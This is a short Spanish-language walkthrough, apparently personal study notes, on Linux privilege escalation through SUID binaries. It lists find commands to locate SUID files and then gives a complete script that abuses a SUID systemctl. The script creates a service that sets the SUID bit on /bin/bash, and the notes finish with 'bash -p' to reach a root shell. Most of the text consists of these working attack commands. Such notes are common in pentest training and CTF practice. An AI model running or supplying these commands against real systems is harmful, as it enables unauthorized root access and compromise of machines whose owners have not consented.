 lo primero que vamos a hacer es una búsqueda de permisos SUID con el siguiente comando.
find / -perm -4000 -ls 2>/dev/null 
o este 
find / -user root -perm -4000 -print 2>/dev/null

![[Pasted image 20230830174332.png]]
para mas información sobre permisos SUID visitar el siguiente enlace 
https://itsfoss.com/es/linux-suid-guid-sticky-bit/

listo ahora que sabemos que binarios son "vulnerables"
![[Pasted image 20230901214828.png]]
podemos buscar en GTFobins que da una muy buena base de datos sobre metodos para explotar las vulnerabilidades de los binarios
si hacemos un ls -lah /usr/bin/sudo  vemos lo siguiente :
![[Pasted image 20230901215222.png]]
y todos los binarios que aparecieron en la búsqueda.  tienen la estructura -rwsr-xr-x root root
fijémonos en el binario /bin/systemctl
![[Pasted image 20230901215515.png]]
tiene permisos SUID vamos a escalar los privilegios usando lo siguiente
`#!/bin/bash`
`TF=$(mktemp).service`
`echo` `'[Service]`
`Type=oneshot`
`ExecStart=``/bin/sh` `-c` `"chmod +s /bin/bash"`
`[Install]`
`WantedBy=multi-user.target' > $TF`
`/bin/systemctl` `link $TF`
`/bin/systemctl` `enable` `--now $TF`
si todo ha salido bien 
debe aparecer algo como esto:
![[Pasted image 20230901223455.png]]
aqui tenemos que dar enter  y luego podemos ver si ya tenemos permisos en bash 
`which` `bash` `|` `xargs` `ls` `-la`
![[Pasted image 20230901222652.png]]
ahora hacemos un bash -p
y ya somos root
![[Pasted image 20230901222749.png]]
